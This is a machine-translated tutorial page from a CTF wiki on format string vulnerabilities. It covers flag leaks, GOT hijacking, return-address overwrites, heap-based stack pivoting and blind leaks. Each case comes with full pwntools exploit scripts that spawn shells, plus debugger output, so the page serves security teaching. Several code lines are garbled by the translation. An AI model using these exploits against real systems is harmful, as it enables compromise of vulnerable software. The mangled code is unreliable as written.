[EN](./fmtstr_example.md) | [ZH](./fmtstr_example-zh.md)
#Format string vulnerability example


The following is a description of some of the formatting vulnerabilities in the CTF. It is also a common use of formatted strings.


## 64-bit program format string vulnerability


### Principle


In fact, the 64-bit offset calculation is similar to 32-bit, which is the corresponding parameter. Only the first six parameters of the 64-bit function are stored in the corresponding registers. So in the format string vulnerability? Although we did not put data into the corresponding registers, the program will still parse the format according to the format of the format string.


### Examples


Here, we introduce the [pwn200 GoodLuck] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally.


#### Determining protection


```shell

➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```



It can be seen that the program has NX protection and partial RELRO protection enabled.


####分析程序


It can be found that the vulnerability of the program is obvious


```C

  for ( j = 0; j <= 21; ++j )

  {

v5 = format [j];
    if ( !v5 || v11[j] != v5 )

    {

      puts("You answered:");

      printf(format);

      puts("\nBut that was totally wrong lol get rekt");

      fflush(_bss_start);

      result = 0;

      goto LABEL_11;

    }

  }

```



#### Determining the offset


We offset the following at printf, here we only focus on the code part and the stack part.


```shell

gef➤  b printf

Breakpoint 1 at 0x400640

gef➤  r

Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 

what's the flag

123456

You answered:



Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28

28 printf.c: There is no such file or directory.


─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────

   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8

0x7ffff7a627fe <fprintf+142> right
   0x7ffff7a627ff                  nop    

 → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8

0x7ffff7a62807 <printf+7> test al, al
0x7ffff7a62809 <printf+9> mov QWORD PTR [rsp + 0x28], rsi
0x7ffff7a6280e <printf+14> mov QWORD PTR [rsp + 0x30], rdx
───────────────────────────────────────────────────────────────────────[ stack ]────

['0x7fffffffdb08', 'l8']

8

0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8	 ← $rsp

0x00007fffffffdb10│+0x08: 0x0000000031000001

0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)

0x00007fffffffdb20│ + 0x18: 0x0000000000602010 → &quot;You answered: \ ng&quot;
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"

0x00007fffffffdb30│+0x28: "flag{11111111111111111"

0x00007fffffffdb38│+0x30: "11111111111111"

0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)

──────────────────────────────────────────────────────────────────────────────[ trace ]────

[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")

[#1] 0x400890 → Name: main()

─────────────────────────────────────────────────────────────────────────────────────────────────





```



It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to `%order$s` in the fmt string is the order of the arguments after the fmt string, so we only need to type `%9$s` to get the contents of the flag. Of course, we have an easier way to use fmtarg in https://github.com/scwuaptx/Pwngdb to determine the offset of a parameter.


```shell

gef➤  fmtarg 0x00007fffffffdb28

The index of format argument : 10

```



Note that we have to break at printf.


#### Using the program


```python

from pwn import *

from LibcSearcher import *

goodluck = ELF('./goodluck')

if args['REMOTE']:

    sh = remote('pwn.sniperoj.cn', 30017)

else:

    sh = process('./goodluck')

payload = "%9$s"

print payload

##gdb.attach(sh)

sh.sendline(payload)

print sh.recv()

sh.interactive()

```



## hijack GOT



### Principle


In the current C program, the functions in libc are all jumped through the GOT table. In addition, the GOT entry corresponding to each libc function can be modified without enabling RELRO protection. Therefore, we can modify the GOT table content of one libc function to the address of another libc function to achieve control of the program. For example, we can modify the contents of the got item of printf to the address of the system function. Thus, the program actually executes the system function when it executes printf.


Suppose we override the address of function A as the address of function B, then this attack technique can be divided into the following steps.


- Determine the GOT table address of function A.

- The function A we used in this step is usually in the program, so we can find it by simply finding the address.


- Determine the memory address of function B


- This step usually requires us to find a way to leak the address of the corresponding function B.


- Write the memory address of function B to the GOT table address of function A.


- This step generally requires us to use the vulnerability of the function to trigger. The general use methods are as follows


- Write function: write function.
- ROP


        ```text

        pop eax; ret; 			# printf@got -> eax

        pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx

        add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset

        ```



- Format string to write at any address


### Examples


Here we take [pwn3] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3) in the 2016 CCTF as an example.


#### Determining protection


as follows


```shell

➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default.


####分析程序


First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function.


```C

int get_file()

{

  char dest; // [sp+1Ch] [bp-FCh]@5

  char s1; // [sp+E4h] [bp-34h]@1

  char *i; // [sp+10Ch] [bp-Ch]@3



  printf("enter the file name you want to get:");

  __isoc99_scanf("%40s", &s1);

  if ( !strncmp(&s1, "flag", 4u) )

    puts("too young, too simple");

  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )

  {

    if ( !strcmp(i, &s1) )

    {

strcpy (&amp; dest, i + 0x28);
return printf (&amp; dest);
    }

  }

return printf (&amp; dest);
}

```



#### Exploiting ideas


Since there is a format string vulnerability, we can determine the following ideas


- Bypass password
- Determine formatting string parameter offset
- Use put@got to get the put function address, and then get the corresponding version of libc.so, and then get the corresponding system function address.
- Modify the contents of puts@got to the address of system.
- When the program executes the puts function again, it actually executes the system function.


#### Vulnerability Program


as follows


```python

from pwn import *

from LibcSearcher import LibcSearcher

##context.log_level = 'debug'

pwn3 = ELF (&#39;./pwn3&#39;)
if args['REMOTE']:

    sh = remote('111', 111)

else:

    sh = process('./pwn3')





def get(name):

    sh.sendline('get')

    sh.recvuntil('enter the file name you want to get:')

    sh.sendline(name)

    data = sh.recv()

    return data





def put(name, content):

    sh.sendline('put')

    sh.recvuntil('please enter the name of the file you want to upload:')

    sh.sendline(name)

    sh.recvuntil('then, enter the content:')

    sh.sendline(content)





def show_dir():

sh.sendline ( &#39;you&#39;)




tmp = 'sysbdmin'

name = ""

for i in tmp:

    name += chr(ord(i) - 1)





## password

def password():

    sh.recvuntil('Name (ftp.hacker.server:Rainism):')

    sh.sendline(name)





##password

password()

## get the addr of puts
puts_got = pwn3.got['puts']

log.success('puts got : ' + hex(puts_got))

put('1111', '%8$s' + p32(puts_got))

puts_addr = u32(get('1111')[:4])



## get addr of system

libc = LibcSearcher("puts", puts_addr)

system_offset = libc.dump('system')

puts_offset = libc.dump('puts')

system_addr = puts_addr - puts_offset + system_offset

log.success('system addr : ' + hex(system_addr))



## modify puts@got, point to system_addr

payload = fmtstr_payload(7, {puts_got: system_addr})

put('/bin/sh;', payload)

sh.recvuntil('ftp>')

sh.sendline('get')

sh.recvuntil('enter the file name you want to get:')

##gdb.attach(sh)

sh.sendline('/bin/sh;')



## system('/bin/sh')

show_dir()

sh.interactive()

```



note


- The offset I used when getting the address of the puts function is 8, because I want the first 4 bytes of my output to be the address of the puts function. In fact, the offset of the first address of the format string is 7.
- Here I used the fmtstr\_payload function in pwntools to get the results we hoped for. If you are interested, you can check the official documentation. For example, here fmtstr\_payload(7, {puts\_got: system\_addr}) means that the offset of my format string is 7, I want to write the system\_addr address at the puts\_got address. By default it is written in bytes.


## hijack retaddr



### Principle


It&#39;s easy to understand that we&#39;re going to use the format string vulnerability to hijack the return address of the program to the address we want to execute.


### Examples


Here we take [three white hat-pwnme_k0] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three white hats-pwnme_k0) as an example for analysis.


#### Determining protection


```shell

➜ Three white hats - pwnme_k0 git: (master) ✗ checksec pwnme_k0
    Arch:     amd64-64-little

    RELRO:    Full RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```



It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program.


####分析程序


A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function.


```C

int __usercall sub_400B07 @ <eax> (char format @ <dil> , char formata, __int64 a3, char a4)
{

  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);

printf (&amp; formatata, &quot;Welc0me to sangebaimao! \ n&quot;);
return printf (&amp; a4 + 4);
}

```



The output is &amp;a4 + 4. Let’s go back and find out that the password we read in is also


```C

    v6 = read(0, (char *)&a4 + 4, 0x14uLL);

```



Of course, we can also find that the username we read in is 20 bytes from the password.


```C

  puts("Input your username(max lenth:20): ");

  fflush(stdout);

  v8 = read(0, &bufa, 0x14uLL);

  if ( v8 && v8 <= 0x14u )

  {

    puts("Input your password(max lenth:20): ");

    fflush(stdout);

    v6 = read(0, (char *)&a4 + 4, 0x14uLL);

    fflush(stdout);

*(_QWORD *)buf = bufa;
* (_ QWORD *) (buf + 8) = a3;
    *(_QWORD *)(buf + 16) = a4;

```



Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired.


#### Using ideas


Our ultimate goal is to get the system&#39;s shell. We can find that in the given file, there is a function that directly calls system(&#39;bin/sh&#39;) at the address 0x00000000004008A6 (about this discovery, generally the program is now roughly take a look.). Then if we modify the return address of a function to this address, it is equivalent to getting the shell.


Although the memory that stores the return address itself is dynamically changing, its address relative to rbp does not change, so we can use the relative address to calculate. Use ideas as follows


- Determine the offset
- Get the rbp and return address of the function
- Get the address where the return address is stored based on the relative offset
- Write the address of the execution system function call to the address where the return address is stored.


#### Determining the offset


First, let&#39;s first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&amp;a4 + 4) function that outputs the password under the breakpoint.


```text

Register Account first!

Input your username(max lenth:20): 

aaaaaaaa

Input your password(max lenth:20): 

%p%p%p%p%p%p%p%p%p%p

Register Success!!

1.Sh0w Account Infomation!

2.Ed1t Account Inf0mation!

3.QUit sangebaimao:(

>error options

1.Sh0w Account Infomation!

2.Ed1t Account Inf0mation!

3.QUit sangebaimao:(

>1

...

```



At this point the stack is

```text

─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────

     0x400b1a                  call   0x400758

0x400b1fe rdi, [rbp + 0x10]
     0x400b23                  mov    eax, 0x0

 →   0x400b28                  call   0x400770

   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0

0x400776 xchg ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8

0x40077e xchg ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────

0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp

0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30

0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi

0x00007fffffffdb58│+0x18: 0x000000000000000a

0x00007fffffffdb60│+0x20: 0x7025702500000000

0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"

0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"

0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2

```



We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8.


#### Change address


We will carefully observe the information of the stack at the breakpoint.


```text

0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15	 ← $rsp, $rbp

0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30

0x00007fffffffdb50│+0x10: "aaaaaaaa"	 ← $rdi

0x00007fffffffdb58│+0x18: 0x000000000000000a

0x00007fffffffdb60│+0x20: 0x7025702500000000

0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"

0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"

0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2

```



You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7.


At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address.


0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48.


It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(&quot;/bin /sh&quot;)


```assembly

.text:00000000004008A6 sub_4008A6      proc near

.text:00000000004008A6 ; __unwind {

.text:00000000004008A6                 push    rbp

.text:00000000004008A7                 mov     rbp, rsp

.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"

.text:00000000004008AF                 call    system

.text:00000000004008B4                 pop     rdi

.text:00000000004008B5                 pop     rsi

.text:00000000004008B6                 pop     rdx

.text: 00000000004008B7 retn
```



#### Using the program
```python

from pwn import *

context.log_level="debug"

context.arch="amd64"



sh=process("./pwnme_k0")

binary=ELF("pwnme_k0")

#gdb.attach(sh)



sh.recv()

sh.writeline("1"*8)

sh.recv()

sh.writeline("%6$p")

sh.recv()

sh.writeline("1")

sh.recvuntil("0x")

ret_addr = int(sh.recvline().strip(),16) - 0x38

Success ( &quot;ret_addr:&quot; + Hex (ret_addr))




sh.recv()

sh.writeline("2")

sh.recv()

sh.sendline (p64 (ret_addr))
sh.recv()

#sh.writeline("%2214d%8$hn")

#0x4008aa-0x4008a6

sh.writeline("%2218d%8$hn")



sh.recv()

sh.writeline("1")

sh.recv()

sh.interactive()

```



## Formatted string vulnerability on heap


### Principle


The so-called formatted string on the heap means that the formatted string itself is stored on the heap. This mainly increases the difficulty of getting the corresponding offset. In general, the formatted string is likely to be copied. On the stack.


### Examples


Here we take [contacts] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts) in CSAW 2015 as an example.


#### Determining protection


```shell

➜  2015-CSAW-contacts git:(master) ✗ checksec contacts

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```



It can be seen that the program not only turns on NX protection but also turns on Canary.


####分析程序


A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it carefully, you can find a format string vulnerability when printing contact information.


```C

int __cdecl PrintInfo(int a1, int a2, int a3, char *format)

{

  printf("\tName: %s\n", a1);

  printf("\tLength %u\n", a2);
  printf("\tPhone #: %s\n", a3);

  printf("\tDescription: ");

  return printf(format);

}

```



Take a closer look and you can see that this format actually points to the heap.


#### Using ideas


Our basic purpose is to get the system&#39;s shell and get the flag. In fact, since there is a format string vulnerability, we should be able to control the program flow by hijacking the got table or controlling the return address of the program. But it is not very feasible here. The reasons are as follows


- The reason why we can&#39;t hijack got to control the program flow is because we found that only the printf function that can be output to our given string is common in the program. We only have to select it to construct /bin/sh to execute it. (&#39;/bin/sh&#39;), but the printf function is also used elsewhere, which will cause the program to crash directly.
- Secondly, it is not possible to directly control the program return address to control the program flow because we do not have a directly executable address to store our contents, and use the format string to write directly to the stack system__addr + &#39;bbbb &#39; + addr of &#39;/bin/sh&#39; doesn&#39;t seem to be realistic.




So what can we do? We also have the skills to talk about stack overflow before, stack pivoting. And here, what we can control happens to be heap memory, so we can move the stack to the heap. Here we use the leave command for stack migration, so before migration we need to modify the program to save the value of ebp to the value we want. Only then will esp become the value we want when we execute the leave instruction. At the same time, because we are using the format string to modify, so we have to know the address of the ebp store, and the address of the ebp stored in the PrintInfo function changes every time, and we can not know by other means. . However, the ebp value pushed into the stack in the program actually saves the address of the ebp value of the previous function**, so we can modify the value of the saved ebp of the upper layer function, ie the upper upper layer function ( That is, the main function) ebp value**. In this way, when the upper program returns, the operation of migrating the stack to the heap is implemented.


The basic idea is as follows


- First get the address of the system function
- Determine by libc database by leaking the address of a libc function.
- Construct a basic contact description as system\_addr + &#39;bbbb&#39; + binsh\_addr
- Modify the ebp saved by the upper function (ie the ebp of the upper layer function) to the address -** of the storage system\_addr.
- When the main program returns, the following operations will occur
- move esp, ebp, point esp to the address of system\_addr -4
- pop ebp, point esp to system\_addr
- ret, get the shell by pointing eip to system\_addr.


#### Get the relevant address and offset


Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function.


First, we get the system function address and /bin/sh address according to the libc\_start\_main\_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows


```shell

 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>

   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]

      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    

      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]

      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    

───────────────────────────────────────────────────────────────────────────────────────[ stack ]────

['0xffffccfc', 'l8']

8

0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp

0xffffcd00│+0x04: 0x0804c420  →  "1234567"

0xffffcd04│+0x08: 0x0804c410  →  "11111"

0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355

0xffffcd0c│+0x10: 0x00000000

0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0

0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0

0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp

──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────

[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")

[#1] 0x8048c27 → leave 

[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1

[# 3] 0x80487a2 → jmp 0x80487b3
[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)

[# 5] 0x80485e1 → holds
────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  dereference $esp 140

['$esp', '140']

1

0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp

gef➤  dereference $esp l140

['$esp', 'l140']

140

0xffffccfc│+0x00: 0x08048c27  →   leave 	 ← $esp

0xffffcd00│+0x04: 0x0804c420  →  "1234567"

0xffffcd04│+0x08: 0x0804c410  →  "11111"

0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355

0xffffcd0c│+0x10: 0x00000000

0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0

0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0

0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp

0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1

0xffffcd20│+0x24: 0x0804b0a8  →  "11111"

0xffffcd24│+0x28: 0x00002b67 ("g+"?)

0xffffcd28│+0x2c: 0x0804c410  →  "11111"

0xffffcd2c│+0x30: 0x0804c420  →  "1234567"

0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887

0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)

0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"

0xffffcd3c│+0x40: 0x00000000

0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0

0xffffcd44│+0x48: 0x00000000

0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000

0xffffcd4c│ + 0x50: 0x080487a2 → jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"

0xffffcd54│+0x58: 0xffffcd68  →  0x00000004

0xffffcd58│+0x5c: 0x00000050 ("P"?)

0xffffcd5c│+0x60: 0x00000000

0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000

0xffffcd64│+0x68: 0x08048288  →  0x00000082

0xffffcd68│+0x6c: 0x00000004

0xffffcd6c│+0x70: 0x0000000a

0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0

0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0

0xffffcd78│+0x7c: 0x00000000

0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10

0xffffcd80│+0x84: 0x00000001

0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"

0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"

```



We can get it by simple judgment.


```

0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10

```



Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31.


```shell

gef➤  fmtarg 0xffffcd7c

The index of format argument : 32

```



This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address.


Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts.


Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function.


```shell

0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp

```


#### Constructing a contact to get the heap address


After learning the above information, we can use the following method to get the heap address and the corresponding ebp address.


```text

[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]

```



To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings.


Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again.


In some environments, the system address will appear \x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows:


```text

[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]

```



If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak.


#### Modify ebp


Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction.


We have already learned the ebp value we want to modify, and we know that the corresponding offset is 11, so we can construct the following payload to modify the corresponding value.


```

part1 = (heap_addr - 4) / 2

part2 = heap_addr - 4 - part1

payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

```



#### Get the shell


At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell.


#### Using the program


```python

from pwn import *

from LibcSearcher import *

contact = ELF('./contacts')

##context.log_level = 'debug'

if args['REMOTE']:

    sh = remote(11, 111)

else:

    sh = process('./contacts')





def createcontact(name, phone, descrip_len, description):

sh.recvuntil (&#39;&gt;&gt;&gt;&#39;)
    sh.sendline('1')

    sh.recvuntil('Contact info: \n')

    sh.recvuntil('Name: ')

    sh.sendline(name)

    sh.recvuntil('You have 10 numbers\n')

    sh.sendline(phone)

    sh.recvuntil('Length of description: ')

    sh.sendline(descrip_len)

    sh.recvuntil('description:\n\t\t')

    sh.sendline(description)





def printcontact():

sh.recvuntil (&#39;&gt;&gt;&gt;&#39;)
    sh.sendline('4')

    sh.recvuntil('Contacts:')

    sh.recvuntil('Description: ')





## get system addr & binsh_addr

payload = &#39;% 31 $ paaaa&#39;
createcontact('1111', '1111', '111', payload)

print contact ()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)

log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))

libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)

libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')

system_addr = libc_base + libc.dump('system')

binsh_addr = libc_base + libc.dump('str_bin_sh')

log.success('get system addr: ' + hex(system_addr))

log.success('get binsh addr: ' + hex(binsh_addr))

##gdb.attach(sh)



## get heap addr and ebp addr

payload = flat([

    system_addr,

&#39;yyyah&#39;,
    binsh_addr,

    '%6$p%11$pcccc',

])

createcontact('2222', '2222', '222', payload)

print contact ()
sh.recvuntil('Description: ')

data = sh.recvuntil('cccc', drop=True)

data = data.split('0x')

print data

ebp_addr = int(data[1], 16)

heap_addr = int(data[2], 16)



## modify ebp

part1 = (heap_addr - 4) / 2

part2 = heap_addr - 4 - part1

payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

##print payload

createcontact('3333', '123456789', '300', payload)

print contact ()
sh.recvuntil('Description: ')

sh.recvuntil('Description: ')

##gdb.attach(sh)

print 'get shell'

sh.recvuntil (&#39;&gt;&gt;&gt;&#39;)
##get shell

sh.sendline('5')

sh.interactive()

```

In the case of system 0 truncation, exp is as follows:
```python

from pwn import *

context.log_level="debug"

context.arch="x86"



io=process("./contacts")

binary=ELF("contacts")

libc=binary.libc


def createcontact(io, name, phone, descrip_len, description):

I sh =
sh.recvuntil (&#39;&gt;&gt;&gt;&#39;)
	sh.sendline('1')

	sh.recvuntil('Contact info: \n')

	sh.recvuntil('Name: ')

	sh.sendline(name)

	sh.recvuntil('You have 10 numbers\n')

	sh.sendline(phone)

	sh.recvuntil('Length of description: ')

	sh.sendline(descrip_len)

	sh.recvuntil('description:\n\t\t')

	sh.sendline(description)

def printcontact(io):

I sh =
sh.recvuntil (&#39;&gt;&gt;&gt;&#39;)
	sh.sendline('4')

	sh.recvuntil('Contacts:')

	sh.recvuntil('Description: ')



# Gdb.attach (I)


createcontact (io, &quot;1&quot;, &quot;1&quot;, &quot;111&quot;, &quot;% 31 $ paaaa&quot;)
printcontact (I)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241

log.success('get libc_start_main addr: ' + hex(libc_start_main))

libc_base=libc_start_main-libc.symbols["__libc_start_main"]

system=libc_base+libc.symbols["system"]

binsh=libc_base+next(libc.search("/bin/sh"))

log.success("system: "+hex(system))

log.success("binsh: "+hex(binsh))



payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"

createcontact(io,'2', '2', '111', payload)

printcontact (I)
io.recvuntil (&#39;Description:&#39;)
data = io.recvuntil('ccc', drop=True)

data = data.split('0x')

print data

ebp_addr = int(data[1], 16)

heap_addr = int(data[2], 16)+12

log.success("ebp: "+hex(system))

log.success("heap: "+hex(heap_addr))



part1 = (heap_addr - 4) / 2

part2 = heap_addr - 4 - part1

payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'



#payload=fmtstr_payload(6,{ebp_addr:heap_addr})

##print payload

createcontact(io,'3333', '123456789', '300', payload)

printcontact (I)
io.recvuntil (&#39;Description:&#39;)
io.recvuntil (&#39;Description:&#39;)
##gdb.attach(sh)

log.success("get shell")

io.recvuntil (&#39;&gt;&gt;&gt;&#39;)
##get shell

io.sendline ( &#39;5&#39;)
io.interactive ()
```



It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way.


Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \ll and other ways to write this address, so only print a lot.


## Format string blind hit


### Principle


The so-called format string blind typing means that only the interactive ip address and port are given. The corresponding binary file is not given to let us perform pwn. In fact, this is similar to BROP, but BROP uses stack overflow, and here We are using a format string vulnerability. In general, we follow the steps below


- Determine the number of bits in the program
- Identify the location of the vulnerability
-Use


Since I didn&#39;t find the source code after the game, I simply constructed two questions.


### Example 1 - Leaking Stack


Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack).


#### Determine the number of programs


We randomly entered %p and the program echoed the following information.


```shell

➜  blind_fmt_stack git:(master) ✗ nc localhost 9999

%p

0x7ffd4799beb0

G�flag is on the stack%                          

```



Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability.


#### Use


Then let&#39;s take a little test and see


```python

from pwn import *

context.log_level = 'error'





def leak(payload):

    sh = remote('127.0.0.1', 9999)

    sh.sendline(payload)

    data = sh.recvuntil('\n', drop=True)

    if data.startswith('0x'):

        print p64(int(data, 16))

    sh.close()





i = 1

while 1:

    payload = '%{}$p'.format(i)

    leak(payload)

    i += 1



```



Finally, I simply looked at the output and got the flag.


```shell

////////

////////

\x00\x00\x00\x00\x00\x00\x00\xff
flag {exam
s_is_fla

g}\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\xfe\x7f\x00\x00

```



### Example 2 - Blind hijacking got


The source code and deployment files are already in the [blind_fmt_got](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got) folder.


#### Determine the number of programs


